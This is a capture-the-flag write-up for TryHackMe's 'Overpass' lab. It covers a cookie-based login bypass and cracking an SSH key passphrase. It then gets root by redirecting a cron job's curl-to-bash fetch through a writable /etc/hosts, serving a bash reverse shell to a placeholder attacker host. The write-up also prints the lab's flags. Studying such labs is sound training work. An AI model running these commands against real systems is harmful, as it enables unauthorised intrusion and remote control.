# 🏴 Overpass — TryHackMe Writeup

## 📋 Room Information

| Info | Details |
|------|---------|
| **Room** | Overpass |
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **Author** | NinjaJc01 |

---

## 🔍 Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -oN nmap/overpass <target_ip>
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Golang HTTP server |

---

## 🌐 Web Enumeration

### Directory Bruteforce

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/admin`

---

## 🔓 Initial Access

### Analyzing the Login Page

Navigating to `/admin`, I found a login panel. Inspecting the source code revealed a vulnerability in `login.js`:

```javascript
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value=""
} else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```

### 🎯 Vulnerability: Broken Authentication

The script only checks if credentials are incorrect — **any cookie named `SessionToken` with any value bypasses authentication!**

### Exploitation

Using browser DevTools:

```javascript
Cookies.set("SessionToken", "anything")
```

Or via DevTools → Application → Cookies:
- **Name:** `SessionToken`
- **Value:** `anything`
- **Path:** `/`

**Refresh the page** → Access granted! ✅

---

## 🔑 SSH Private Key

After bypassing authentication, I found an **RSA private key** for user `james`.

### Cracking the Passphrase

```bash
# Convert key for John
ssh2john id_rsa > id_rsa.hash

# Crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Password found:** `james13`

### SSH Connection

```bash
chmod 600 id_rsa
ssh -i id_rsa james@<target_ip>
```

### 🚩 User Flag

```bash
cat user.txt
```

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

---

## 🔺 Privilege Escalation

### Enumeration

Checking cron jobs:

```bash
cat /etc/crontab
```

```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

**🎯 Vulnerability:** Root executes a script fetched from `overpass.thm` every minute!

### Checking /etc/hosts Permissions

```bash
ls -la /etc/hosts
```

**Writable!** I can redirect `overpass.thm` to my machine.

### Exploitation Steps

#### 1. Modify /etc/hosts on target

```bash
echo "<your_ip> overpass.thm" >> /etc/hosts
```

#### 2. Create malicious script on attacker machine

```bash
mkdir -p downloads/src
```

```bash
cat > downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
EOF
```

#### 3. Start HTTP server

```bash
python3 -m http.server 80
```

#### 4. Start listener

```bash
nc -lvnp 4444
```

#### 5. Wait for cron (max 1 minute)

**Root shell received!** 🎉

### 🚩 Root Flag

```bash
cat /root/root.txt
```

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## 📊 Attack Summary

```mermaid
flowchart TD
    A[Nmap Scan] --> B[Port 80 - Web]
    B --> C[Gobuster → /admin]
    C --> D[Source Code Analysis]
    D --> E[Cookie Bypass Auth]
    E --> F[Get SSH Key]
    F --> G[ssh2john + John]
    G --> H[SSH as james]
    H --> I[User Flag ✓]
    I --> J[Check Crontab]
    J --> K[Writable /etc/hosts]
    K --> L[Hijack overpass.thm]
    L --> M[Malicious Script]
    M --> N[Reverse Shell as Root]
    N --> O[Root Flag ✓]
```



---

## 🛡️ Lessons Learned

| Vulnerability | Mitigation |
|---------------|------------|
| Broken Authentication | Server-side session validation |
| Exposed SSH Key | Never store private keys on web servers |
| Weak Passphrase | Use strong, unique passphrases |
| Cron + Curl | Use absolute paths, verify sources |
| Writable /etc/hosts | Proper file permissions |

---

## 🧰 Tools Used

- `nmap`
- `gobuster`
- `ssh2john`
- `john`
- `netcat`
- `python3 http.server`

---
